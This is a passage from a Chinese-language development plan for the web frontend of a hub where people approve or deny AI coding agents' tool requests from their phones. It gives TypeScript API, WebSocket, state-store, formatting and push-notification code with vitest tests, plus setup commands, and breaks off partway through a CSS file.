			if d <= outer*outer && d >= inner*inner {
				img.Set(x, y, fg)
			}
		}
	}
	for i := 0; i < bottom-(cyr+outer); i++ {
		y := cyr + outer + i
		x := left + stem + i*(outer)/(bottom-(cyr+outer))
		for w := 0; w < stem; w++ {
			img.Set(x+w, y, fg)
		}
	}
	return img
}

func main() {
	for _, it := range []struct {
		name string
		size int
	}{{"icon-192.png", 192}, {"icon-512.png", 512}, {"apple-touch-icon-180.png", 180}} {
		f, err := os.Create(it.name)
		if err != nil {
			panic(err)
		}
		if err := png.Encode(f, draw(it.size)); err != nil {
			panic(err)
		}
		f.Close()
	}
}
```
Run:
```bash
cd web/public/icons && go run gen.go && ls -la && cd ../../.. && cd web && npm install && git status --short web | head
```
Expected: 三个 PNG 生成；`npm install` 生成 `package-lock.json` 与 `node_modules/`（后者被忽略）。之后一律 `npm ci`。

- [ ] **Step 2: 写类型、接口层与失败的测试**

`web/src/types.ts`:
```ts
export type Kind = 'permission' | 'question' | 'done' | 'webhook'
export type RequestState =
  | 'pending' | 'approved' | 'denied' | 'cancelled' | 'expired'
  | 'auto_allowed' | 'auto_denied' | 'passthrough' | 'recorded'

export interface Payload {
  type: 'shell' | 'file_write' | 'network' | 'mcp' | string
  command?: string
  cwd?: string
  path?: string
  diff_preview?: string
  server?: string
  tool?: string
  args?: unknown
  url?: string
  method?: string
}

export interface RequestView {
  id: string
  machine_id: string
  session_id: string
  kind: Kind
  tool_name: string
  payload: Payload
  risk: string
  project_root: string
  engine_reason: string
  state: RequestState
  decided_by: string
  decision_note: string
  rule_id: string
  turn_id: string
  cli_session_id: string
  title: string
  created_at: string
  expires_at: string | null
  decided_at: string | null
  delivered_at: string | null
  machine_name: string
  project: string
  has_redacted: boolean
}

export interface AuditEvent {
  id: number
  ts: string
  machine_id: string
  actor: string
  request_id: string
  action: string
  detail: string
}

export interface Rule {
  id: string
  source: 'builtin' | 'user' | 'learned' | string
  enabled: boolean
  elevated: boolean
  hit_count: number
  last_hit_at: string | null
  created_at: string
  created_from: string
  yaml: string
}

export interface Machine {
  id: string
  name: string
  online: boolean
  last_seen: string | null
  agent_version: string
  enrolled_at: string
  revoked: boolean
}

export interface Status {
  paused: boolean
  pending: number
  rules_version: number
  machines: { id: string; name: string; online: boolean; last_seen: string | null; revoked: boolean }[]
  uptime: string
  push_enabled: boolean
  push_subscriptions: number
}

export interface Inbox {
  pending: RequestView[]
  questions: RequestView[]
}

export interface Draft {
  rule_id: string
  scope: 'project' | 'global'
  yaml: string
  summary: { action: 'allow' | 'deny'; payload: string; anchor: string }
}

export interface DecideBody {
  action: 'allow' | 'deny'
  note?: string
  remember?: boolean
  scope?: 'project' | 'global'
}

export interface VapidInfo {
  enabled: boolean
  public_key: string
  reason: string
}
```

`web/src/api.ts`:
```ts
import type { DecideBody, Draft, Inbox, Machine, RequestView, Rule, Status, VapidInfo, AuditEvent } from './types'

export class ApiError extends Error {
  constructor(public status: number, message: string) {
    super(message)
    this.name = 'ApiError'
  }
}

let unauthorized: (() => void) | null = null

/** 401 时调用（跳登录页）。 */
export function setUnauthorizedHandler(fn: (() => void) | null) {
  unauthorized = fn
}

interface Options {
  body?: unknown
  contentType?: string
  raw?: BodyInit
}

export async function request<T>(method: string, path: string, opts: Options = {}): Promise<T> {
  const headers: Record<string, string> = {}
  let body: BodyInit | undefined
  if (opts.raw !== undefined) {
    body = opts.raw
    headers['Content-Type'] = opts.contentType ?? 'application/octet-stream'
  } else if (opts.body !== undefined) {
    body = JSON.stringify(opts.body)
    headers['Content-Type'] = 'application/json'
  }
  const resp = await fetch(path, { method, headers, body, credentials: 'same-origin' })
  if (resp.status === 204) return undefined as T
  if (!resp.ok) {
    let msg = `请求失败（${resp.status}）`
    try {
      const j = (await resp.json()) as { error?: string }
      if (j.error) msg = j.error
    } catch {
      // 不是 JSON，用默认文案
    }
    if (resp.status === 401) unauthorized?.()
    throw new ApiError(resp.status, msg)
  }
  return (await resp.json()) as T
}

const get = <T>(p: string) => request<T>('GET', p)
const post = <T>(p: string, body?: unknown) => request<T>('POST', p, { body })
const del = <T>(p: string, body?: unknown) => request<T>('DELETE', p, { body })
const patch = <T>(p: string, body?: unknown) => request<T>('PATCH', p, { body })

export const hub = {
  login: (password: string) => post<void>('/api/login', { password }),
  logout: () => post<void>('/api/logout'),
  status: () => get<Status>('/api/status'),
  inbox: () => get<Inbox>('/api/inbox'),
  requests: (state = '', limit = 50) => get<RequestView[]>(`/api/requests?state=${encodeURIComponent(state)}&limit=${limit}`),
  request: (id: string) => get<{ request: RequestView; audit: AuditEvent[] }>(`/api/requests/${encodeURIComponent(id)}`),
  decide: (id: string, body: DecideBody) => post<RequestView>(`/api/requests/${encodeURIComponent(id)}/decide`, body),
  propose: (id: string, body: { action: 'allow' | 'deny'; scope?: 'project' | 'global' }) => post<Draft>(`/api/requests/${encodeURIComponent(id)}/propose`, body),
  rules: () => get<Rule[]>('/api/rules'),
  setRuleEnabled: (id: string, enabled: boolean) => patch<void>(`/api/rules/${encodeURIComponent(id)}`, { enabled }),
  deleteRule: (id: string) => del<void>(`/api/rules/${encodeURIComponent(id)}`),
  importRules: (yaml: string) => request<{ version: number }>('POST', '/api/rules/import', { raw: yaml, contentType: 'application/yaml' }),
  exportRulesURL: '/api/rules/export',
  machines: () => get<Machine[]>('/api/machines'),
  revokeMachine: (id: string) => del<void>(`/api/machines/${encodeURIComponent(id)}`),
  pause: () => post<void>('/api/pause'),
  resume: () => post<void>('/api/resume'),
  pushVapid: () => get<VapidInfo>('/api/push/vapid'),
  pushSubscribe: (sub: unknown) => post<void>('/api/push/subscribe', sub),
  pushUnsubscribe: (endpoint: string) => del<void>('/api/push/subscribe', { endpoint }),
  pushCheck: (endpoint: string) => post<{ active: boolean }>('/api/push/check', { endpoint }),
  pushTest: (endpoint: string) => post<void>('/api/push/test', { endpoint }),
}
```

`web/src/api.test.ts`:
```ts
import { afterEach, describe, expect, it, vi } from 'vitest'
import { ApiError, hub, request, setUnauthorizedHandler } from './api'

type Call = { url: string; init: RequestInit }
function stubFetch(status: number, body: unknown, calls: Call[] = []) {
  const fetchMock = vi.fn(async (url: string, init: RequestInit) => {
    calls.push({ url, init })
    const text = body === undefined ? '' : typeof body === 'string' ? body : JSON.stringify(body)
    return new Response(status === 204 ? null : text, { status, headers: { 'Content-Type': 'application/json' } })
  })
  vi.stubGlobal('fetch', fetchMock)
  return calls
}

afterEach(() => {
  vi.unstubAllGlobals()
  setUnauthorizedHandler(null)
})

describe('request', () => {
  it('发 JSON 并解析响应', async () => {
    const calls = stubFetch(200, { pending: [], questions: [] })
    const inbox = await hub.inbox()
    expect(inbox.pending).toEqual([])
    expect(calls[0]?.url).toBe('/api/inbox')
    expect(calls[0]?.init.credentials).toBe('same-origin')
  })

  it('204 返回 undefined', async () => {
    stubFetch(204, undefined)
    await expect(hub.pause()).resolves.toBeUndefined()
  })

  it('POST 带 JSON 体与 Content-Type', async () => {
    const calls = stubFetch(200, { id: 'r1' })
    await hub.decide('r 1', { action: 'allow', note: 'ok', remember: true, scope: 'global' })
    expect(calls[0]?.url).toBe('/api/requests/r%201/decide')
    expect(calls[0]?.init.method).toBe('POST')
    expect((calls[0]?.init.headers as Record<string, string>)['Content-Type']).toBe('application/json')
    expect(JSON.parse(calls[0]?.init.body as string)).toEqual({ action: 'allow', note: 'ok', remember: true, scope: 'global' })
  })

  it('导入规则用 YAML 原文', async () => {
    const calls = stubFetch(200, { version: 3 })
    const r = await hub.importRules('version: 1\nrules: []\n')
    expect(r.version).toBe(3)
    expect((calls[0]?.init.headers as Record<string, string>)['Content-Type']).toBe('application/yaml')
    expect(calls[0]?.init.body).toBe('version: 1\nrules: []\n')
  })

  it('非 2xx 抛 ApiError 并带服务端文案', async () => {
    stubFetch(422, { error: '不能记住：含凭据的命令不能记住' })
    const err = await hub.propose('r1', { action: 'allow' }).catch((e: unknown) => e)
    expect(err).toBeInstanceOf(ApiError)
    expect((err as ApiError).status).toBe(422)
    expect((err as ApiError).message).toBe('不能记住：含凭据的命令不能记住')
  })

  it('响应不是 JSON 时用默认文案', async () => {
    stubFetch(502, 'bad gateway')
    const err = await request('GET', '/api/x').catch((e: unknown) => e)
    expect((err as ApiError).message).toBe('请求失败（502）')
  })

  it('401 先调登录失效回调', async () => {
    stubFetch(401, { error: '请先登录' })
    const onUnauthorized = vi.fn()
    setUnauthorizedHandler(onUnauthorized)
    await expect(hub.status()).rejects.toBeInstanceOf(ApiError)
    expect(onUnauthorized).toHaveBeenCalledTimes(1)
  })
})
```

`web/src/ws.ts`:
```ts
export type FrameType = 'request_new' | 'request_updated' | 'rules_updated' | 'status'
export interface Frame {
  type: FrameType
  data: unknown
}

/** 与浏览器 WebSocket 兼容的最小接口，测试用假对象替换。 */
export interface SocketLike {
  onopen: ((ev: unknown) => void) | null
  onmessage: ((ev: { data: unknown }) => void) | null
  onclose: ((ev: { code: number }) => void) | null
  onerror: ((ev: unknown) => void) | null
  close(): void
}

export interface LiveOptions {
  onFrame: (f: Frame) => void
  /** 每次连上（含重连）都调，调用方应全量重新拉取。 */
  onOpen: () => void
  /** 断开时调；code 为 1008 表示登录失效，不再重连。 */
  onDown: (code?: number) => void
  makeSocket?: (url: string) => SocketLike
  backoff?: number[]
  setTimer?: (fn: () => void, ms: number) => unknown
  clearTimer?: (t: unknown) => void
}

export const defaultBackoff = [1000, 2000, 4000, 8000, 16000, 30000]

export function nextDelay(attempt: number, backoff: number[] = defaultBackoff): number {
  return backoff[Math.min(attempt, backoff.length - 1)] ?? 30000
}

export function wsURL(loc: { protocol: string; host: string } = window.location): string {
  return (loc.protocol === 'https:' ? 'wss://' : 'ws://') + loc.host + '/ws/client'
}

/** 维护到 /ws/client 的长连接：断开后按退避重连，1008 停止。 */
export class Live {
  private sock: SocketLike | null = null
  private attempt = 0
  private timer: unknown = null
  private stopped = false
  private readonly make: (url: string) => SocketLike
  private readonly backoff: number[]
  private readonly setTimer: (fn: () => void, ms: number) => unknown
  private readonly clearTimer: (t: unknown) => void

  constructor(private readonly opts: LiveOptions) {
    this.make = opts.makeSocket ?? ((url) => new WebSocket(url) as unknown as SocketLike)
    this.backoff = opts.backoff ?? defaultBackoff
    this.setTimer = opts.setTimer ?? ((fn, ms) => setTimeout(fn, ms))
    this.clearTimer = opts.clearTimer ?? ((t) => clearTimeout(t as number))
  }

  start() {
    this.stopped = false
    this.connect()
  }

  stop() {
    this.stopped = true
    if (this.timer !== null) {
      this.clearTimer(this.timer)
      this.timer = null
    }
    this.sock?.close()
    this.sock = null
  }

  private connect() {
    if (this.stopped) return
    const s = this.make(wsURL())
    this.sock = s
    s.onopen = () => {
      this.attempt = 0
      this.opts.onOpen()
    }
    s.onmessage = (ev) => {
      try {
        const f = JSON.parse(String(ev.data)) as Frame
        if (f && typeof f.type === 'string') this.opts.onFrame(f)
      } catch {
        // 坏帧忽略
      }
    }
    s.onerror = () => {
      // 随后会触发 onclose
    }
    s.onclose = (ev) => {
      if (this.sock !== s) return
      this.sock = null
      this.opts.onDown(ev.code)
      if (this.stopped || ev.code === 1008) return
      const delay = nextDelay(this.attempt, this.backoff)
      this.attempt++
      this.timer = this.setTimer(() => {
        this.timer = null
        this.connect()
      }, delay)
    }
  }
}
```

`web/src/ws.test.ts`:
```ts
import { describe, expect, it, vi } from 'vitest'
import { Live, nextDelay, wsURL, type SocketLike } from './ws'

class FakeSocket implements SocketLike {
  onopen: ((ev: unknown) => void) | null = null
  onmessage: ((ev: { data: unknown }) => void) | null = null
  onclose: ((ev: { code: number }) => void) | null = null
  onerror: ((ev: unknown) => void) | null = null
  closed = false
  close() {
    this.closed = true
  }
}

vi.stubGlobal('window', { location: { protocol: 'https:', host: 'hub.example.com' } })

describe('nextDelay', () => {
  it('按退避序列并封顶', () => {
    expect([0, 1, 2, 5, 9].map((a) => nextDelay(a))).toEqual([1000, 2000, 4000, 30000, 30000])
  })
})

describe('wsURL', () => {
  it('按页面协议选 wss 或 ws', () => {
    expect(wsURL({ protocol: 'https:', host: 'h' })).toBe('wss://h/ws/client')
    expect(wsURL({ protocol: 'http:', host: 'h:8787' })).toBe('ws://h:8787/ws/client')
  })
})

describe('Live', () => {
  function setup() {
    const sockets: FakeSocket[] = []
    const timers: { fn: () => void; ms: number }[] = []
    const onFrame = vi.fn()
    const onOpen = vi.fn()
    const onDown = vi.fn()
    const live = new Live({
      onFrame,
      onOpen,
      onDown,
      makeSocket: () => {
        const s = new FakeSocket()
        sockets.push(s)
        return s
      },
      setTimer: (fn, ms) => {
        timers.push({ fn, ms })
        return timers.length
      },
      clearTimer: () => {},
    })
    return { live, sockets, timers, onFrame, onOpen, onDown }
  }

  it('连上后分发帧，断开后按退避重连并在重连时再次 onOpen', () => {
    const { live, sockets, timers, onFrame, onOpen, onDown } = setup()
    live.start()
    expect(sockets).toHaveLength(1)
    sockets[0]!.onopen?.({})
    expect(onOpen).toHaveBeenCalledTimes(1)
    sockets[0]!.onmessage?.({ data: JSON.stringify({ type: 'status', data: { paused: true } }) })
    sockets[0]!.onmessage?.({ data: 'not json' })
    expect(onFrame).toHaveBeenCalledTimes(1)
    expect(onFrame.mock.calls[0]?.[0]).toEqual({ type: 'status', data: { paused: true } })
    sockets[0]!.onclose?.({ code: 1006 })
    expect(onDown).toHaveBeenCalledWith(1006)
    expect(timers[0]?.ms).toBe(1000)
    timers[0]!.fn()
    expect(sockets).toHaveLength(2)
    sockets[1]!.onclose?.({ code: 1006 })
    expect(timers[1]?.ms).toBe(2000)
    timers[1]!.fn()
    sockets[2]!.onopen?.({})
    expect(onOpen).toHaveBeenCalledTimes(2)
    sockets[2]!.onclose?.({ code: 1006 })
    expect(timers[2]?.ms).toBe(1000) // 连上过，退避归零
  })

  it('1008 不再重连', () => {
    const { live, sockets, timers, onDown } = setup()
    live.start()
    sockets[0]!.onclose?.({ code: 1008 })
    expect(onDown).toHaveBeenCalledWith(1008)
    expect(timers).toHaveLength(0)
  })

  it('stop 后不再重连并关闭连接', () => {
    const { live, sockets, timers } = setup()
    live.start()
    live.stop()
    expect(sockets[0]!.closed).toBe(true)
    sockets[0]!.onclose?.({ code: 1000 })
    expect(timers).toHaveLength(0)
  })
})
```

`web/src/store.ts`:
```ts
import type { Frame } from './ws'
import type { Inbox, Machine, RequestView, Rule, Status } from './types'

export interface State {
  loaded: boolean
  connected: boolean
  pending: RequestView[]
  questions: RequestView[]
  status: Status | null
  rules: Rule[] | null
  rulesStale: boolean
  machines: Machine[] | null
  error: string | null
  /** 每处理一帧有效的请求变化就加一；历史页据此重新拉取。 */
  tick: number
}

export const initialState: State = {
  loaded: false,
  connected: false,
  pending: [],
  questions: [],
  status: null,
  rules: null,
  rulesStale: false,
  machines: null,
  error: null,
  tick: 0,
}

export type Action =
  | { type: 'loaded'; inbox: Inbox; status: Status }
  | { type: 'rules'; rules: Rule[] }
  | { type: 'machines'; machines: Machine[] }
  | { type: 'status'; status: Status }
  | { type: 'connected'; connected: boolean }
  | { type: 'error'; error: string | null }
  | { type: 'frame'; frame: Frame }

function byCreated(a: RequestView, b: RequestView) {
  return a.created_at < b.created_at ? -1 : a.created_at > b.created_at ? 1 : 0
}

function upsert(list: RequestView[], r: RequestView): RequestView[] {
  const rest = list.filter((x) => x.id !== r.id)
  return [...rest, r].sort(byCreated)
}

function isRequestView(x: unknown): x is RequestView {
  return typeof x === 'object' && x !== null && typeof (x as RequestView).id === 'string' && typeof (x as RequestView).kind === 'string'
}

/** 处理 /ws/client 的一帧。推送只是“有变化”的提示，页面在重连时仍会全量拉取。 */
function applyFrame(state: State, frame: Frame): State {
  switch (frame.type) {
    case 'request_new': {
      if (!isRequestView(frame.data)) return state
      const r = frame.data
      const next = { ...state, tick: state.tick + 1 }
      if (r.kind === 'question') {
        // 同一会话只留最新的问题
        const others = state.questions.filter((q) => q.session_id === '' || q.session_id !== r.session_id)
        return { ...next, questions: [r, ...others] }
      }
      if (r.kind === 'done') {
        return { ...next, questions: state.questions.filter((q) => q.session_id !== r.session_id) }
      }
      // permission、webhook：同一会话有新的审批，旧问题就不再等了
      const questions = r.session_id ? state.questions.filter((q) => q.session_id !== r.session_id) : state.questions
      if (r.state !== 'pending') return { ...next, questions }
      return { ...next, questions, pending: upsert(state.pending, r) }
    }
    case 'request_updated': {
      if (!isRequestView(frame.data)) return state
      const r = frame.data
      const next = { ...state, tick: state.tick + 1 }
      if (r.state === 'pending') return { ...next, pending: upsert(state.pending, r) }
      return { ...next, pending: state.pending.filter((x) => x.id !== r.id) }
    }
    case 'rules_updated':
      return { ...state, rulesStale: true }
    case 'status': {
      const d = frame.data as { paused?: boolean }
      if (!state.status || typeof d?.paused !== 'boolean') return state
      return { ...state, status: { ...state.status, paused: d.paused } }
    }
  }
}

export function reduce(state: State, action: Action): State {
  switch (action.type) {
    case 'loaded':
      return {
        ...state,
        loaded: true,
        error: null,
        pending: [...action.inbox.pending].sort(byCreated),
        questions: action.inbox.questions,
        status: action.status,
      }
    case 'rules':
      return { ...state, rules: action.rules, rulesStale: false }
    case 'machines':
      return { ...state, machines: action.machines }
    case 'status':
      return { ...state, status: action.status }
    case 'connected':
      return { ...state, connected: action.connected }
    case 'error':
      return { ...state, error: action.error }
    case 'frame':
      return applyFrame(state, action.frame)
  }
}

/** 收件箱按项目分组，组内按创建时间升序（等得最久的在前）；没有项目的归到“其他”。 */
export function groupByProject(list: RequestView[]): { project: string; items: RequestView[] }[] {
  const groups = new Map<string, RequestView[]>()
  for (const r of list) {
    const key = r.kind === 'webhook' ? 'webhook' : r.project || '其他'
    const g = groups.get(key)
    if (g) g.push(r)
    else groups.set(key, [r])
  }
  return [...groups.entries()]
    .map(([project, items]) => ({ project, items: items.sort(byCreated) }))
    .sort((a, b) => (a.items[0]!.created_at < b.items[0]!.created_at ? -1 : 1))
}
```

`web/src/store.test.ts`:
```ts
import { describe, expect, it } from 'vitest'
import { groupByProject, initialState, reduce, type State } from './store'
import type { RequestView, Status } from './types'

function req(over: Partial<RequestView>): RequestView {
  return {
    id: 'r', machine_id: 'm', session_id: 's', kind: 'permission', tool_name: 'Bash',
    payload: { type: 'shell', command: 'git push' }, risk: 'outward', project_root: '/p/blog', engine_reason: '无规则命中',
    state: 'pending', decided_by: '', decision_note: '', rule_id: '', turn_id: 't', cli_session_id: 's', title: '',
    created_at: '2026-10-23T10:00:00.000000000Z', expires_at: null, decided_at: null, delivered_at: null,
    machine_name: 'mac', project: 'blog', has_redacted: false, ...over,
  }
}
const status: Status = { paused: false, pending: 0, rules_version: 1, machines: [], uptime: '1s', push_enabled: false, push_subscriptions: 0 }

function loaded(): State {
  return reduce(initialState, { type: 'loaded', inbox: { pending: [req({ id: 'b', created_at: '2026-10-23T10:00:02Z' }), req({ id: 'a', created_at: '2026-10-23T10:00:01Z' })], questions: [] }, status })
}

describe('reduce', () => {
  it('loaded 按创建时间排序', () => {
    const s = loaded()
    expect(s.loaded).toBe(true)
    expect(s.pending.map((r) => r.id)).toEqual(['a', 'b'])
  })

  it('request_new 的 pending 进收件箱并去重', () => {
    let s = loaded()
    s = reduce(s, { type: 'frame', frame: { type: 'request_new', data: req({ id: 'c', created_at: '2026-10-23T10:00:03Z' }) } })
    s = reduce(s, { type: 'frame', frame: { type: 'request_new', data: req({ id: 'c', created_at: '2026-10-23T10:00:03Z' }) } })
    expect(s.pending.map((r) => r.id)).toEqual(['a', 'b', 'c'])
  })

  it('request_updated 为终态时移出收件箱', () => {
    let s = loaded()
    s = reduce(s, { type: 'frame', frame: { type: 'request_updated', data: req({ id: 'a', state: 'approved' }) } })
    expect(s.pending.map((r) => r.id)).toEqual(['b'])
    expect(s.tick).toBe(1)
  })

  it('问题：同会话只留最新；done 或新审批收掉它', () => {
    let s = loaded()
    const q1 = req({ id: 'q1', kind: 'question', state: 'recorded', session_id: 's1', title: '删旧分支？' })
    const q2 = req({ id: 'q2', kind: 'question', state: 'recorded', session_id: 's1', title: '再问一次' })
    const q3 = req({ id: 'q3', kind: 'question', state: 'recorded', session_id: 's2', title: '用哪个库？' })
    s = reduce(s, { type: 'frame', frame: { type: 'request_new', data: q1 } })
    s = reduce(s, { type: 'frame', frame: { type: 'request_new', data: q2 } })
    s = reduce(s, { type: 'frame', frame: { type: 'request_new', data: q3 } })
    expect(s.questions.map((q) => q.id)).toEqual(['q3', 'q2'])
    s = reduce(s, { type: 'frame', frame: { type: 'request_new', data: req({ id: 'd', kind: 'done', state: 'recorded', session_id: 's1' }) } })
    expect(s.questions.map((q) => q.id)).toEqual(['q3'])
    s = reduce(s, { type: 'frame', frame: { type: 'request_new', data: req({ id: 'p', session_id: 's2' }) } })
    expect(s.questions).toEqual([])
    expect(s.pending.map((r) => r.id)).toContain('p')
  })

  it('rules_updated 标记过期，status 帧改暂停', () => {
    let s = loaded()
    s = reduce(s, { type: 'rules', rules: [] })
    s = reduce(s, { type: 'frame', frame: { type: 'rules_updated', data: { version: 2 } } })
    expect(s.rulesStale).toBe(true)
    s = reduce(s, { type: 'frame', frame: { type: 'status', data: { paused: true } } })
    expect(s.status?.paused).toBe(true)
  })

  it('坏帧不改状态', () => {
    const s = loaded()
    expect(reduce(s, { type: 'frame', frame: { type: 'request_new', data: 'nope' } })).toBe(s)
  })
})

describe('groupByProject', () => {
  it('按项目分组，组内按时间，webhook 单独一组', () => {
    const g = groupByProject([
      req({ id: '1', project: 'blog', created_at: '2026-10-23T10:00:05Z' }),
      req({ id: '2', project: 'shop', created_at: '2026-10-23T10:00:01Z' }),
      req({ id: '3', project: 'blog', created_at: '2026-10-23T10:00:02Z' }),
      req({ id: '4', kind: 'webhook', project: '', machine_name: '', created_at: '2026-10-23T10:00:03Z' }),
      req({ id: '5', project: '', created_at: '2026-10-23T10:00:04Z' }),
    ])
    expect(g.map((x) => [x.project, x.items.map((r) => r.id)])).toEqual([
      ['shop', ['2']],
      ['blog', ['3', '1']],
      ['webhook', ['4']],
      ['其他', ['5']],
    ])
  })
})
```

`web/src/format.ts`:
```ts
import type { Payload, RequestView } from './types'

export function relativeTime(iso: string, now: Date = new Date()): string {
  const t = new Date(iso).getTime()
  if (Number.isNaN(t)) return ''
  const sec = Math.round((now.getTime() - t) / 1000)
  if (sec < 45) return '刚刚'
  if (sec < 3600) return `${Math.max(1, Math.round(sec / 60))} 分钟前`
  if (sec < 86400) return `${Math.round(sec / 3600)} 小时前`
  if (sec < 172800) return '昨天'
  const d = new Date(t)
  return `${d.getMonth() + 1}-${String(d.getDate()).padStart(2, '0')}`
}

const risks: Record<string, [string, 'low' | 'mid' | 'high']> = {
  read: ['只读', 'low'],
  write_in_project: ['项目内改动', 'low'],
  unknown: ['无法判断', 'mid'],
  write_outside: ['项目外改动', 'mid'],
  network: ['联网', 'mid'],
  outward: ['对外', 'high'],
  destructive: ['不可逆', 'high'],
}

export function riskLabel(risk: string): string {
  return risks[risk]?.[0] ?? (risk || '未分级')
}

export function riskTone(risk: string): 'low' | 'mid' | 'high' {
  return risks[risk]?.[1] ?? 'mid'
}

export function payloadSummary(p: Payload): string {
  switch (p.type) {
    case 'shell':
      return (p.command ?? '').trim()
    case 'file_write':
      return p.path ?? ''
    case 'network':
      return `${p.method ? p.method + ' ' : ''}${p.url ?? ''}`
    case 'mcp':
      return [p.server, p.tool].filter(Boolean).join('/')
    default:
      return p.type
  }
}

const states: Record<string, string> = {
  pending: '等待决定',
  approved: '已批准',
  denied: '已拒绝',
  cancelled: '已取消',
  expired: '已过期',
  auto_allowed: '自动放行',
  auto_denied: '自动拒绝',
  passthrough: '交回终端',
  recorded: '已记录',
}

export function stateLabel(state: string): string {
  return states[state] ?? state
}

const kinds: Record<string, string> = { permission: '审批', question: '等你回答', done: '完成', webhook: 'webhook' }

export function kindLabel(kind: string): string {
  return kinds[kind] ?? kind
}

/** 一条历史记录的依据：谁决定的、按哪条规则。 */
export function decidedByLabel(r: Pick<RequestView, 'decided_by' | 'rule_id' | 'state'>): string {
  const by = r.decided_by
  if (by.startsWith('rule:') || r.rule_id) return `规则 ${r.rule_id || by.slice(5)}`
  const map: Record<string, string> = {
    user: '手机上决定',
    terminal: '终端里处理了',
    timeout: '等待过期',
    hub_unreachable: '连不上 hub，交回终端',
    gemini: 'Gemini 交回原生确认',
    paused: '已暂停自动审批',
    shutdown: '守护进程停止',
    resend: '被重发顶掉',
    agent_restart: '守护进程重连后不再持有',
    machine_revoked: '机器已吊销',
    error: '决定来源出错',
  }
  return map[by] ?? (by || (r.state === 'pending' ? '' : stateLabel(r.state)))
}
```

`web/src/format.test.ts`:
```ts
import { describe, expect, it } from 'vitest'
import { decidedByLabel, kindLabel, payloadSummary, relativeTime, riskLabel, riskTone, stateLabel } from './format'

describe('relativeTime', () => {
  const now = new Date('2026-10-23T12:00:00Z')
  it('分档', () => {
    expect(relativeTime('2026-10-23T11:59:50Z', now)).toBe('刚刚')
    expect(relativeTime('2026-10-23T11:57:00Z', now)).toBe('3 分钟前')
    expect(relativeTime('2026-10-23T09:00:00Z', now)).toBe('3 小时前')
    expect(relativeTime('2026-10-22T09:00:00Z', now)).toBe('昨天')
    expect(relativeTime('2026-10-01T09:00:00Z', now)).toMatch(/^10-01$/)
    expect(relativeTime('garbage', now)).toBe('')
  })
})

describe('labels', () => {
  it('风险', () => {
    expect(riskLabel('outward')).toBe('对外')
    expect(riskTone('outward')).toBe('high')
    expect(riskTone('read')).toBe('low')
    expect(riskLabel('')).toBe('未分级')
  })
  it('载荷摘要', () => {
    expect(payloadSummary({ type: 'shell', command: ' git push ' })).toBe('git push')
    expect(payloadSummary({ type: 'file_write', path: '/p/a.go' })).toBe('/p/a.go')
    expect(payloadSummary({ type: 'network', url: 'https://x', method: 'POST' })).toBe('POST https://x')
    expect(payloadSummary({ type: 'mcp', server: 'fs', tool: 'write' })).toBe('fs/write')
  })
  it('状态、种类与依据', () => {
    expect(stateLabel('auto_allowed')).toBe('自动放行')
    expect(kindLabel('question')).toBe('等你回答')
    expect(decidedByLabel({ decided_by: 'rule:builtin-readonly', rule_id: 'builtin-readonly', state: 'auto_allowed' })).toBe('规则 builtin-readonly')
    expect(decidedByLabel({ decided_by: 'user', rule_id: '', state: 'approved' })).toBe('手机上决定')
    expect(decidedByLabel({ decided_by: 'hub_unreachable', rule_id: '', state: 'expired' })).toBe('连不上 hub，交回终端')
  })
})
```

`web/src/pwa.ts`:
```ts
/** 是否从主屏幕图标启动（iOS 只有这时才有推送能力）。 */
export function isStandalone(): boolean {
  const nav = navigator as Navigator & { standalone?: boolean }
  return nav.standalone === true || (typeof window.matchMedia === 'function' && window.matchMedia('(display-mode: standalone)').matches)
}

export function isIOS(): boolean {
  return /iPhone|iPad|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)
}

/** 能否订阅推送：看 PushManager 是否存在，不看 Service Worker 状态（iOS 在 Safari 标签页里 SW 能注册但没有 PushManager）。 */
export function pushSupported(): boolean {
  return 'serviceWorker' in navigator && 'PushManager' in window && 'Notification' in window
}

/** VAPID 公钥（base64url）转成 subscribe 要的字节。 */
export function urlBase64ToUint8Array(s: string): Uint8Array {
  const padded = s + '='.repeat((4 - (s.length % 4)) % 4)
  const b64 = padded.replace(/-/g, '+').replace(/_/g, '/')
  const raw = atob(b64)
  const out = new Uint8Array(raw.length)
  for (let i = 0; i < raw.length; i++) out[i] = raw.charCodeAt(i)
  return out
}

export async function registerServiceWorker(): Promise<ServiceWorkerRegistration | null> {
  if (!('serviceWorker' in navigator)) return null
  try {
    return await navigator.serviceWorker.register('/sw.js')
  } catch {
    return null
  }
}

export async function getSubscription(): Promise<PushSubscription | null> {
  if (!pushSupported()) return null
  const reg = await navigator.serviceWorker.ready
  return reg.pushManager.getSubscription()
}

/** 订阅推送。必须在用户点击的处理函数里第一个调用（iOS 要求授权请求直接来自用户手势）。 */
export async function subscribe(publicKey: string): Promise<PushSubscription> {
  const permission = await Notification.requestPermission()
  if (permission !== 'granted') throw new Error('没有获得通知权限')
  const reg = await navigator.serviceWorker.ready
  return reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: urlBase64ToUint8Array(publicKey) as BufferSource })
}
```

`web/src/pwa.test.ts`:
```ts
import { describe, expect, it } from 'vitest'
import { urlBase64ToUint8Array } from './pwa'

describe('urlBase64ToUint8Array', () => {
  it('解 base64url，补位与否都行', () => {
    expect([...urlBase64ToUint8Array('BAEC')]).toEqual([4, 1, 2])
    expect([...urlBase64ToUint8Array('BAE')]).toEqual([4, 1])
    expect([...urlBase64ToUint8Array('BAE=')]).toEqual([4, 1])
    expect([...urlBase64ToUint8Array('-_8')]).toEqual([251, 255])
  })
})
```

- [ ] **Step 3: 跑测试确认失败**

Run: `cd web && npx vitest run`
Expected: 全部通过的只有已写完的模块；此时 `api.ts` 等文件已在 Step 2 一起写了，所以这一步应当通过。若有失败，先修到通过再写页面。（接口层没有“先红后绿”的独立实现步骤：测试与实现在同一步写，因为它们只是围绕 fetch 的薄封装；页面组件不写单元测试，由 Task 11 的端到端覆盖。）

- [ ] **Step 4: 写外壳、登录页与页面骨架**

`web/src/app.css`:
```css
:root {
  --bg: #ffffff;
  --fg: #111827;
  --muted: #6b7280;
  --line: #e5e7eb;
  --card: #f9fafb;
  --brand: #1f2a44;
  --brand-fg: #ffffff;
  --low: #15803d;
  --mid: #b45309;
  --high: #b91c1c;
  --low-bg: #dcfce7;
  --mid-bg: #fef3c7;
  --high-bg: #fee2e2;
  --radius: 12px;
  --gutter: 16px;
  --nav-h: 56px;
}
@media (prefers-color-scheme: dark) {
  :root {
    --bg: #0f1115;
    --fg: #e5e7eb;
    --muted: #9ca3af;
    --line: #2a2f3a;
    --card: #171a21;
    --brand: #3b4a73;
    --low-bg: #0f2e1a;
